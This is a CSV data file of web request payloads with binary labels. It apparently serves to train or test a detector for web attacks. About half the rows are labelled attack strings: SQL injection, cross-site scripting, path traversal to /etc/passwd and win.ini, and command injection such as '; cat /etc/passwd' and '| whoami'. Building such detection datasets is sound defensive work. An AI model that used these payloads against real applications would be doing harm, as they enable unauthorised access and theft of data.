payload,label
../../../../etc/passwd,1
/cart?session=20369,0
dashboard,0
/register?id=1676,0
../../../../etc/passwd,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
/index?id=7292,0
' OR 8=1 --,1
admin%00' OR 1=1,1
user,0
/checkout?id=1653,0
admin'/* bypass */OR 1=1,1
/contact?id=8892,0
/register?id=330,0
dashboard,0
/profile?session=21092,0
u6HTF3LZY,0
ILIlKBacx,0
/login?id=6891,0
qaWcS8LLH4OLT,0
javascript:alert(1),1
admin'/* bypass */OR 1=1,1
| whoami,1
checkout,0
nvq2C36Ie0rpW,0
| whoami,1
checkout,0
' OR 3=5 --,1
/register?session=35730,0
/contact?id=2434,0
admin' --,1
dashboard,0
/blog?id=8822,0
cart,0
' OR 1=1 --,1
/cart?id=4473,0
../../../../etc/passwd,1
cart,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
1' o r '1'='1,1
register,0
| whoami,1
/profile?session=54485,0
GsuZSsyWkhFxAt,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>var a=546;alert(a)</script>,1
<script>var a=576;alert(a)</script>,1
<script>alert(document.cookie)</script>,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
admin' --,1
onerror=alert(1),1
cbRbVAWaD0,0
KK7a2B6WfzP,0
<script>var a=448;alert(a)</script>,1
; cat /etc/passwd,1
/about?session=92952,0
' OR 7=2 --,1
../../../../etc/passwd,1
/dashboard?id=7361,0
profile,0
/cart?session=80681,0
<script>var a=643;alert(a)</script>,1
/register?id=5743,0
' OR '1'='1,1
CClZtW1GXg1,0
/register?session=69159,0
1' o r '1'='1,1
/cart?id=8908,0
/settings?id=1802,0
/profile?id=3591,0
<script>var a=674;alert(a)</script>,1
cart,0
../../../../etc/passwd,1
<script>var a=50;alert(a)</script>,1
admin%00' OR 1=1,1
1' o r '1'='1,1
home,0
' OR 9=1 --,1
/register?id=3505,0
search,0
onerror=alert(1),1
cDbrtjYzO,0
<script>var a=521;alert(a)</script>,1
/about?id=6533,0
/blog?id=9579,0
' OR 3=5 --,1
../../../windows/win.ini,1
dashboard,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/contact?id=8930,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
' OR 5=9 --,1
<script>var a=912;alert(a)</script>,1
QDXJSlNF6,0
<script>var a=640;alert(a)</script>,1
/login?id=7270,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
cart,0
TJYwJxqUEM,0
admin'/* bypass */OR 1=1,1
/profile?id=2945,0
; cat /etc/passwd,1
/contact?session=37456,0
/profile?id=2325,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/contact?session=88456,0
<script>var a=761;alert(a)</script>,1
/contact?id=7195,0
' OR 2=4 --,1
/search?session=85340,0
<script>var a=891;alert(a)</script>,1
<script>var a=629;alert(a)</script>,1
' OR 6=5 --,1
<script>var a=828;alert(a)</script>,1
gCHk1iyN1,0
register,0
login,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
home,0
about,0
' OR 3=3 --,1
home,0
/contact?id=2692,0
' OR 1=1 --,1
/settings?session=34301,0
wmXZ085dRb,0
WALAUfSSSDw,0
rmSaTpqhq,0
' OR '1'='1,1
/settings?session=23404,0
' OR 1=4 --,1
blog,0
<script>var a=999;alert(a)</script>,1
home,0
<script>var a=338;alert(a)</script>,1
cart,0
/dashboard?id=9443,0
onerror=alert(1),1
| whoami,1
DziltRmd3,0
/home?id=93,0
admin'/* bypass */OR 1=1,1
/register?session=66486,0
6AX39lxcwW,0
; cat /etc/passwd,1
' OR 3=1 --,1
/home?id=4968,0
javascript:alert(1),1
settings,0
1' o r '1'='1,1
/about?session=80960,0
/user?id=5940,0
/register?session=89086,0
/contact?id=3925,0
nRMIwGHmBOGjI,0
/dashboard?id=6290,0
/dashboard?id=1293,0
<script>var a=963;alert(a)</script>,1
/contact?id=2156,0
/profile?id=3762,0
cart,0
profile,0
s E l E c T * f R o M a d m i n,1
/login?session=12322,0
/index?session=62526,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
onerror=alert(1),1
<script>alert(document.cookie)</script>,1
javascript:alert(1),1
/profile?id=2467,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/profile?session=82648,0
register,0
dashboard,0
/profile?session=24405,0
' OR '1'='1,1
| whoami,1
<script>var a=737;alert(a)</script>,1
7UM9VcJQwkp,0
; cat /etc/passwd,1
register,0
<script>var a=814;alert(a)</script>,1
cart,0
/blog?id=1795,0
' OR 4=4 --,1
/profile?session=45025,0
AfBZseWmGMDJ,0
' OR 1=3 --,1
s E l E c T * f R o M a d m i n,1
IKfIy0BlWi,0
1' o r '1'='1,1
blog,0
' OR 1=1 --,1
<script>var a=40;alert(a)</script>,1
' OR '1'='1,1
/checkout?session=78565,0
<script>var a=64;alert(a)</script>,1
/dashboard?id=7230,0
' OR 3=2 --,1
/user?session=34880,0
seSWXY25B,0
1' o r '1'='1,1
1' o r '1'='1,1
/profile?session=57382,0
jLTbytw18,0
/register?id=7446,0
' OR 8=4 --,1
/about?session=64300,0
/contact?session=31614,0
admin%00' OR 1=1,1
about,0
<script>var a=966;alert(a)</script>,1
contact,0
<script>var a=936;alert(a)</script>,1
/cart?session=50920,0
' OR '1'='1,1
admin%00' OR 1=1,1
' OR 7=9 --,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/contact?session=24697,0
/checkout?id=7655,0
settings,0
/search?session=78268,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/blog?session=41584,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>var a=595;alert(a)</script>,1
VDiCKzn8,0
' OR 9=8 --,1
4aq2LmQEtRMsssD,0
s E l E c T * f R o M a d m i n,1
/login?session=18609,0
/search?id=9362,0
<script>var a=30;alert(a)</script>,1
admin' --,1
vSrzoGdmpp5h,0
../../../windows/win.ini,1
s E l E c T * f R o M a d m i n,1
' OR 2=4 --,1
../../../../etc/passwd,1
PQiwSO90,0
' OR 4=1 --,1
L5BrLwAmlCmRnA3,0
blog,0
<script>var a=623;alert(a)</script>,1
; cat /etc/passwd,1
/register?id=2215,0
../../../../etc/passwd,1
cart,0
admin%00' OR 1=1,1
' OR 1=4 --,1
oyWMID4zhrGDI,0
' OR 1=1 --,1
7VBlCCOeXPyHv7d,0
register,0
../../../../etc/passwd,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/search?id=1597,0
; cat /etc/passwd,1
about,0
1' o r '1'='1,1
' OR 4=3 --,1
/checkout?id=711,0
<script>var a=734;alert(a)</script>,1
/checkout?session=85586,0
<script>var a=289;alert(a)</script>,1
/dashboard?session=71208,0
o21WHzwhk,0
/search?session=11848,0
<script>var a=513;alert(a)</script>,1
admin%00' OR 1=1,1
gjI9nmmY,0
/register?id=7487,0
/home?session=94501,0
' OR 9=7 --,1
/home?id=1220,0
| whoami,1
/login?session=24983,0
/index?session=15700,0
PPudSIOfJrS,0
ZstYXRiqiQKg,0
pGGQXT9Hh8,0
../../../../etc/passwd,1
/search?session=61428,0
PeybmC8og9,0
/profile?id=9494,0
/cart?session=45140,0
<script>var a=731;alert(a)</script>,1
rdRjFpmJ,0
admin%00' OR 1=1,1
' OR 7=8 --,1
index,0
admin%00' OR 1=1,1
0WWRVAIOugnZVAh,0
/register?id=4879,0
javascript:alert(1),1
jpiOIhIASI4q,0
s E l E c T * f R o M a d m i n,1
r1WwvSBtP,0
/blog?id=8519,0
cart,0
home,0
/blog?id=7694,0
' OR '1'='1,1
<script>var a=998;alert(a)</script>,1
/search?session=66631,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/user?id=8991,0
onerror=alert(1),1
admin%00' OR 1=1,1
/home?session=55168,0
ybRnvjUk1MU39Q,0
../../../../etc/passwd,1
/blog?id=7721,0
index,0
pJnOuYj6,0
' OR 6=2 --,1
/user?id=9194,0
javascript:alert(1),1
<script>alert(document.cookie)</script>,1
' OR 2=9 --,1
/checkout?id=9134,0
<script>var a=816;alert(a)</script>,1
search,0
<script>var a=809;alert(a)</script>,1
; cat /etc/passwd,1
<script>var a=56;alert(a)</script>,1
admin'/* bypass */OR 1=1,1
<script>var a=15;alert(a)</script>,1
1' o r '1'='1,1
' OR 1=9 --,1
' OR 6=2 --,1
; cat /etc/passwd,1
dashboard,0
/contact?id=3471,0
admin'/* bypass */OR 1=1,1
dashboard,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
/contact?id=4768,0
<script>var a=683;alert(a)</script>,1
dashboard,0
1' o r '1'='1,1
WUyquj6YTv1k,0
admin'/* bypass */OR 1=1,1
../../../windows/win.ini,1
search,0
| whoami,1
Gyr7jKrYxPlX,0
/search?id=5802,0
/login?id=317,0
about,0
/contact?session=51627,0
/about?session=67604,0
admin'/* bypass */OR 1=1,1
login,0
NIMc0bx1nZ9,0
onerror=alert(1),1
../../../../etc/passwd,1
1' o r '1'='1,1
home,0
/blog?session=33165,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
' OR 4=8 --,1
/search?session=15089,0
aiSyZp5qLaUe,0
1' o r '1'='1,1
peKM7YJMOeZz,0
s E l E c T * f R o M a d m i n,1
XCOCRFSVkJvkUkl,0
blog,0
<script>var a=509;alert(a)</script>,1
profile,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/settings?id=2262,0
' OR 2=1 --,1
/user?session=10621,0
admin' --,1
<script>var a=702;alert(a)</script>,1
<script>var a=10;alert(a)</script>,1
/user?session=15586,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR 2=5 --,1
/about?session=26196,0
../../../../etc/passwd,1
<script>var a=244;alert(a)</script>,1
<script>var a=522;alert(a)</script>,1
s E l E c T * f R o M a d m i n,1
<script>var a=900;alert(a)</script>,1
/cart?session=88418,0
' OR 3=3 --,1
profile,0
/settings?session=38549,0
' OR 9=7 --,1
login,0
' OR '1'='1,1
' OR 6=8 --,1
' OR 9=2 --,1
/settings?session=52486,0
1CQhCrLdnkQ9V,0
/register?id=4892,0
/contact?id=9674,0
blog,0
' OR 9=8 --,1
/user?session=98262,0
dashboard,0
/dashboard?session=94342,0
; cat /etc/passwd,1
' OR 1=1 --,1
/home?id=7448,0
/search?session=56523,0
| whoami,1
/user?id=7077,0
3nJr0wDVaaVByJ4,0
<script>var a=593;alert(a)</script>,1
' OR 4=2 --,1
<script>var a=262;alert(a)</script>,1
<script>var a=652;alert(a)</script>,1
<script>var a=879;alert(a)</script>,1
/home?session=12824,0
fAx14rhBsim,0
' OR 1=5 --,1
VhrLEB1uh,0
/login?id=6346,0
<script>var a=31;alert(a)</script>,1
/contact?id=745,0
; cat /etc/passwd,1
/login?session=57479,0
<script>var a=228;alert(a)</script>,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
UBbsNR53dj,0
<script>var a=710;alert(a)</script>,1
/settings?session=28855,0
ai3UvzAe0,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
' OR 8=1 --,1
/home?id=7376,0
/search?session=25055,0
../../../../etc/passwd,1
/about?session=62414,0
' OR 1=1 --,1
' OR 9=5 --,1
BL3o3oak,0
' OR 9=5 --,1
jmcirY4BH8r,0
/contact?id=4838,0
/register?id=5151,0
admin' --,1
/search?id=9570,0
/contact?session=19588,0
/profile?id=702,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
' OR 4=9 --,1
1' o r '1'='1,1
' OR '1'='1,1
<script>alert(document.cookie)</script>,1
register,0
/settings?id=8708,0
/settings?session=87712,0
<script>var a=269;alert(a)</script>,1
/about?session=14782,0
' OR 4=5 --,1
admin' --,1
admin%00' OR 1=1,1
admin' --,1
' OR '1'='1,1
/dashboard?id=5203,0
settings,0
<script>alert(document.cookie)</script>,1
contact,0
../../../windows/win.ini,1
' OR 9=1 --,1
<script>var a=857;alert(a)</script>,1
' OR '1'='1,1
register,0
<script>var a=712;alert(a)</script>,1
fCCm05F0JPOsR,0
' OR 3=2 --,1
/login?session=64697,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
blog,0
AndEa9xybXUIlq,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
../../../windows/win.ini,1
/register?id=8140,0
' OR '1'='1,1
nhxQKEBhazeAJK,0
/search?id=6589,0
/about?id=4204,0
<script>alert(document.cookie)</script>,1
1e9djKB5lFBNZ,0
search,0
1' o r '1'='1,1
| whoami,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
admin'/* bypass */OR 1=1,1
/register?session=40217,0
/cart?id=3092,0
admin%00' OR 1=1,1
<script>var a=697;alert(a)</script>,1
/about?session=82453,0
admin'/* bypass */OR 1=1,1
<script>var a=448;alert(a)</script>,1
cart,0
/blog?session=12455,0
admin%00' OR 1=1,1
/register?session=46333,0
AQ5V9jK0oe,0
T5V1GwFSi,0
../../../../etc/passwd,1
<script>var a=137;alert(a)</script>,1
dashboard,0
/register?session=77357,0
user,0
../../../windows/win.ini,1
search,0
' OR 1=1 --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
user,0
<script>var a=47;alert(a)</script>,1
/about?session=96239,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
<script>alert(document.cookie)</script>,1
<script>alert(document.cookie)</script>,1
/about?id=2246,0
admin'/* bypass */OR 1=1,1
../../../../etc/passwd,1
/blog?session=56419,0
JXDtFXjxjkpbM,0
/login?id=2095,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
1' o r '1'='1,1
' OR 9=7 --,1
5xSU8jp8,0
x9bEzJHCs,0
/home?id=6367,0
' OR 8=1 --,1
YoaUwKrOb3a0,0
s E l E c T * f R o M a d m i n,1
<script>var a=440;alert(a)</script>,1
admin' --,1
/contact?session=78776,0
admin' --,1
/about?id=3784,0
blog,0
pNnuENOe,0
blog,0
sZjRrykbU,0
; cat /etc/passwd,1
<script>var a=372;alert(a)</script>,1
<script>var a=913;alert(a)</script>,1
KjlcI4irp,0
' OR 2=2 --,1
| whoami,1
' OR 1=1 --,1
../../../windows/win.ini,1
javascript:alert(1),1
' OR 3=2 --,1
' OR 1=7 --,1
/home?id=3189,0
' OR '1'='1,1
DsZalFk6BqH,0
cart,0
/profile?id=2956,0
uRpg4tuIQy9,0
wJY95xoSbvA8k,0
/dashboard?id=9797,0
javascript:alert(1),1
PeJMUFgObmcJR,0
IuRpz09xQ4Yw8gr,0
1' o r '1'='1,1
<script>var a=186;alert(a)</script>,1
<script>alert(document.cookie)</script>,1
/about?session=29894,0
blog,0
../../../../etc/passwd,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
<script>var a=933;alert(a)</script>,1
settings,0
../../../windows/win.ini,1
../../../windows/win.ini,1
1' o r '1'='1,1
<script>var a=809;alert(a)</script>,1
/contact?session=61999,0
/login?session=31958,0
' OR 7=2 --,1
/index?session=86729,0
register,0
' OR '1'='1,1
admin%00' OR 1=1,1
<script>var a=875;alert(a)</script>,1
s E l E c T * f R o M a d m i n,1
HwBNsaU02SHs,0
admin'/* bypass */OR 1=1,1
/search?id=584,0
' OR '1'='1,1
javascript:alert(1),1
<script>var a=944;alert(a)</script>,1
settings,0
LG5Ss8whNtBo,0
/checkout?id=6953,0
<script>var a=720;alert(a)</script>,1
<script>var a=24;alert(a)</script>,1
/dashboard?session=37879,0
/profile?id=2290,0
' OR 2=8 --,1
admin%00' OR 1=1,1
/dashboard?session=67137,0
<script>var a=395;alert(a)</script>,1
ZvjWBg5T3,0
' OR 4=1 --,1
/home?session=93351,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/index?id=1529,0
/checkout?session=65853,0
register,0
index,0
contact,0
' OR 3=9 --,1
/home?id=5089,0
/index?session=58265,0
<script>alert(document.cookie)</script>,1
settings,0
' OR 1=1 --,1
<script>var a=912;alert(a)</script>,1
/register?id=3806,0
../../../../etc/passwd,1
/about?session=39837,0
/dashboard?id=4661,0
/checkout?id=6571,0
' OR 5=7 --,1
<script>var a=762;alert(a)</script>,1
/about?session=68344,0
/settings?id=614,0
/blog?session=89950,0
/cart?session=24153,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
../../../windows/win.ini,1
JXxGE2DNrs,0
' OR 9=7 --,1
qKpXoMg09kL,0
' OR 2=3 --,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
<script>alert(document.cookie)</script>,1
/profile?id=7562,0
/login?id=8020,0
/contact?session=27177,0
' OR 1=6 --,1
../../../../etc/passwd,1
UKeHjWZc4NyFnAJ,0
' OR '1'='1,1
' OR 3=2 --,1
ICNdY7pcpsY,0
/profile?id=162,0
onerror=alert(1),1
../../../../etc/passwd,1
QosDgqI0tqCCvwU,0
<script>var a=228;alert(a)</script>,1
ZxnaDId48Tn,0
admin' --,1
<script>var a=544;alert(a)</script>,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
J2SoEsy6Trf,0
cart,0
../../../windows/win.ini,1
' OR '1'='1,1
EI7PObYQ2,0
<script>var a=926;alert(a)</script>,1
' OR '1'='1,1
' OR 3=5 --,1
EQAZ6oXjZFD,0
TFUOMTl0MrybMW,0
' OR 2=2 --,1
onerror=alert(1),1
/search?id=8346,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
admin%00' OR 1=1,1
register,0
/login?session=75521,0
admin'/* bypass */OR 1=1,1
<script>var a=941;alert(a)</script>,1
/contact?id=3658,0
/cart?session=54303,0
/about?session=39227,0
<script>var a=709;alert(a)</script>,1
<script>var a=428;alert(a)</script>,1
/profile?id=6571,0
' OR 8=6 --,1
cart,0
WZAdhefJ,0
<script>var a=472;alert(a)</script>,1
RsnvjoolnGPBg,0
/about?session=72659,0
<script>var a=296;alert(a)</script>,1
' OR 4=4 --,1
/login?id=2427,0
XcC6dGcGoksIe,0
COxycwQ9F,0
javascript:alert(1),1
/search?id=4401,0
search,0
admin%00' OR 1=1,1
/user?id=1872,0
/register?session=87450,0
onerror=alert(1),1
/cart?session=84658,0
onerror=alert(1),1
../../../windows/win.ini,1
' OR 7=2 --,1
' OR 1=9 --,1
' OR 6=2 --,1
<script>alert(document.cookie)</script>,1
../../../windows/win.ini,1
/contact?session=86944,0
kCUcsuceCPuJa,0
admin%00' OR 1=1,1
/blog?id=5849,0
/dashboard?session=34814,0
JFDHuh2Fv,0
/cart?session=32205,0
' OR 1=8 --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
<script>var a=788;alert(a)</script>,1
user,0
i6txaumGq,0
dashboard,0
kAE9uwtALRiJmV,0
index,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
onerror=alert(1),1
/checkout?session=28493,0
| whoami,1
/login?session=16840,0
<script>var a=451;alert(a)</script>,1
<script>var a=163;alert(a)</script>,1
../../../../etc/passwd,1
/home?id=7440,0
; cat /etc/passwd,1
Q9OXARWPW,0
index,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
54P9eiMNta,0
4RRoVcOvjw,0
/home?session=20895,0
mnE0SCthvhi6,0
index,0
' OR 9=4 --,1
onerror=alert(1),1
' OR 7=1 --,1
/dashboard?id=8869,0
s E l E c T * f R o M a d m i n,1
<script>var a=853;alert(a)</script>,1
/blog?session=38074,0
admin'/* bypass */OR 1=1,1
<script>alert(document.cookie)</script>,1
/search?session=79991,0
GmP3fpTys,0
/search?session=33032,0
| whoami,1
blog,0
' OR 1=6 --,1
' OR 2=6 --,1
<script>alert(document.cookie)</script>,1
checkout,0
| whoami,1
' OR 8=6 --,1
s E l E c T * f R o M a d m i n,1
wgX3HFBx,0
contact,0
QV6WiCr1r,0
<script>var a=868;alert(a)</script>,1
blog,0
<script>alert(document.cookie)</script>,1
; cat /etc/passwd,1
' OR 5=1 --,1
../../../windows/win.ini,1
' OR '1'='1,1
| whoami,1
vZknAjuK2WTZPX,0
j9qimJ7g,0
login,0
DpSL2kPXgFQtXZP,0
/dashboard?session=18758,0
; cat /etc/passwd,1
onerror=alert(1),1
jyyQP8SIaUVVMQM,0
/profile?session=83368,0
<script>alert(document.cookie)</script>,1
/contact?session=77012,0
' OR 1=3 --,1
/about?session=52084,0
; cat /etc/passwd,1
onerror=alert(1),1
<script>var a=109;alert(a)</script>,1
' OR 5=2 --,1
<script>var a=248;alert(a)</script>,1
' OR 1=1 --,1
' OR 5=8 --,1
/cart?id=7893,0
' OR 1=1 --,1
' OR '1'='1,1
/login?session=30166,0
login,0
/home?session=29102,0
' OR 5=4 --,1
cart,0
javascript:alert(1),1
/index?session=16586,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/register?session=66844,0
<script>var a=212;alert(a)</script>,1
<script>var a=227;alert(a)</script>,1
cWA5HdiTS2XyAYL,0
/checkout?id=2732,0
rG85kIMQzlEP2DB,0
/blog?session=94020,0
jD0tnauV1NHWIcZ,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
dashboard,0
/contact?session=67988,0
settings,0
<script>var a=170;alert(a)</script>,1
kuOL0GxaqZRq,0
s E l E c T * f R o M a d m i n,1
/login?id=1490,0
' OR 4=5 --,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
/search?session=84488,0
' OR 6=2 --,1
s E l E c T * f R o M a d m i n,1
/login?session=79706,0
<script>alert(document.cookie)</script>,1
search,0
admin' --,1
dashboard,0
; cat /etc/passwd,1
lzVsMyC3ZmYI81z,0
checkout,0
<script>var a=272;alert(a)</script>,1
../../../windows/win.ini,1
/cart?session=55647,0
1' o r '1'='1,1
/cart?session=64426,0
mgVUucThJ,0
<script>alert(document.cookie)</script>,1
search,0
1' o r '1'='1,1
admin' --,1
' OR 1=4 --,1
/about?session=42148,0
OXd9emvVwutKxy,0
../../../windows/win.ini,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
javascript:alert(1),1
' OR 1=1 --,1
/user?session=35890,0
/search?id=4762,0
' OR 2=6 --,1
' OR 9=4 --,1
' OR 5=9 --,1
about,0
dashboard,0
dashboard,0
<script>var a=370;alert(a)</script>,1
<script>var a=457;alert(a)</script>,1
<script>var a=450;alert(a)</script>,1
' OR 2=5 --,1
fpRT6wVer,0
<script>var a=310;alert(a)</script>,1
/index?id=4709,0
/home?session=44656,0
<script>var a=365;alert(a)</script>,1
/contact?id=3658,0
/dashboard?session=99142,0
/cart?id=6989,0
' OR '1'='1,1
ZPgxHM2Jrl,0
1' o r '1'='1,1
javascript:alert(1),1
/blog?session=10177,0
/settings?id=5697,0
| whoami,1
/index?session=50233,0
<script>var a=476;alert(a)</script>,1
/contact?id=6932,0
admin' --,1
' OR 6=8 --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/checkout?id=8024,0
dashboard,0
index,0
<script>var a=862;alert(a)</script>,1
' OR 1=1 --,1
<script>var a=565;alert(a)</script>,1
K9SqaEgPu,0
' OR 1=1 --,1
<script>var a=689;alert(a)</script>,1
ZOLxFSDPKhrXNy,0
/profile?session=12815,0
admin'/* bypass */OR 1=1,1
' OR 3=1 --,1
<script>var a=1;alert(a)</script>,1
' OR 1=3 --,1
/user?id=2633,0
../../../../etc/passwd,1
8iEZclmYHyJWKI,0
' OR 7=6 --,1
| whoami,1
admin%00' OR 1=1,1
0qkzhZtW,0
/user?id=1457,0
; cat /etc/passwd,1
home,0
../../../../etc/passwd,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
' OR 6=2 --,1
/checkout?id=1844,0
../../../windows/win.ini,1
<script>var a=218;alert(a)</script>,1
/contact?id=8431,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
login,0
user,0
admin' --,1
<script>alert(document.cookie)</script>,1
FfJfX4qh,0
<script>var a=880;alert(a)</script>,1
/contact?id=1984,0
<script>var a=450;alert(a)</script>,1
<script>var a=741;alert(a)</script>,1
1' o r '1'='1,1
71OkZ9FDsEVsax,0
; cat /etc/passwd,1
' OR 1=7 --,1
jij2hzEsxD,0
' OR 5=2 --,1
<script>var a=608;alert(a)</script>,1
/contact?session=84181,0
cart,0
/user?session=28535,0
user,0
register,0
about,0
/settings?id=8905,0
javascript:alert(1),1
admin'/* bypass */OR 1=1,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
<script>var a=488;alert(a)</script>,1
admin'/* bypass */OR 1=1,1
../../../../etc/passwd,1
/user?session=12258,0
<script>var a=513;alert(a)</script>,1
<script>var a=361;alert(a)</script>,1
9W9zjfTM5nENLZ,0
admin'/* bypass */OR 1=1,1
/about?id=8114,0
CAtRK6HiWZP5IV,0
' OR 9=2 --,1
/settings?id=6315,0
/checkout?session=71124,0
/home?session=38721,0
<script>var a=775;alert(a)</script>,1
/register?id=2363,0
xBEEp3JMyPq9Vua,0
1' o r '1'='1,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/profile?session=28047,0
register,0
s E l E c T * f R o M a d m i n,1
/profile?id=3340,0
settings,0
' OR 7=1 --,1
s E l E c T * f R o M a d m i n,1
/checkout?session=27244,0
FrrRHaiJr7SiZ,0
yQBBNO30,0
<script>var a=941;alert(a)</script>,1
' OR 7=4 --,1
../../../windows/win.ini,1
onerror=alert(1),1
checkout,0
<script>var a=397;alert(a)</script>,1
/user?session=81754,0
; cat /etc/passwd,1
/index?session=42982,0
blog,0
2XJw5VXT0mg,0
/login?session=21225,0
MSqMD4JdRlbt,0
s E l E c T * f R o M a d m i n,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
1' o r '1'='1,1
' OR 5=6 --,1
<script>var a=579;alert(a)</script>,1
BgsFBBwcRCPA,0
search,0
5ImAod9c6eqjfMQ,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
/dashboard?id=3363,0
/about?session=20140,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
onerror=alert(1),1
/login?id=4930,0
/home?session=18544,0
login,0
' OR 6=5 --,1
<script>var a=689;alert(a)</script>,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
<script>alert(document.cookie)</script>,1
about,0
onerror=alert(1),1
tlROKEZ3UxQBm,0
/checkout?session=70294,0
search,0
/cart?session=50497,0
1' o r '1'='1,1
1' o r '1'='1,1
/index?session=95061,0
f41CCIcU,0
admin%00' OR 1=1,1
/home?id=5290,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
/profile?id=799,0
/home?id=7197,0
9BrfFR5zzKBea,0
PT7yJYpd,0
../../../windows/win.ini,1
' OR 4=9 --,1
fURtCKJk602JL,0
dMd1iedpT07,0
/about?session=72060,0
/index?id=3095,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR 7=7 --,1
/contact?id=7240,0
XGNFrVA1Yh,0
' OR 7=1 --,1
' OR 2=8 --,1
<script>var a=1;alert(a)</script>,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/checkout?session=72207,0
dashboard,0
settings,0
' OR 3=7 --,1
/settings?session=14118,0
home,0
/search?session=71644,0
' OR 1=4 --,1
<script>alert(document.cookie)</script>,1
s E l E c T * f R o M a d m i n,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
index,0
index,0
/blog?session=26770,0
pSQm2EtoRQp6C,0
<script>var a=976;alert(a)</script>,1
/user?id=7359,0
admin%00' OR 1=1,1
' OR 6=9 --,1
' OR '1'='1,1
' OR '1'='1,1
profile,0
blog,0
<script>alert(document.cookie)</script>,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
' OR 9=9 --,1
settings,0
/register?id=5985,0
<script>var a=987;alert(a)</script>,1
admin%00' OR 1=1,1
<script>alert(document.cookie)</script>,1
/dashboard?id=7699,0
/login?id=1934,0
FZcAbQmC1thxD,0
onerror=alert(1),1
9FM7TuYD2V,0
' OR 6=1 --,1
' OR 4=8 --,1
' OR 4=2 --,1
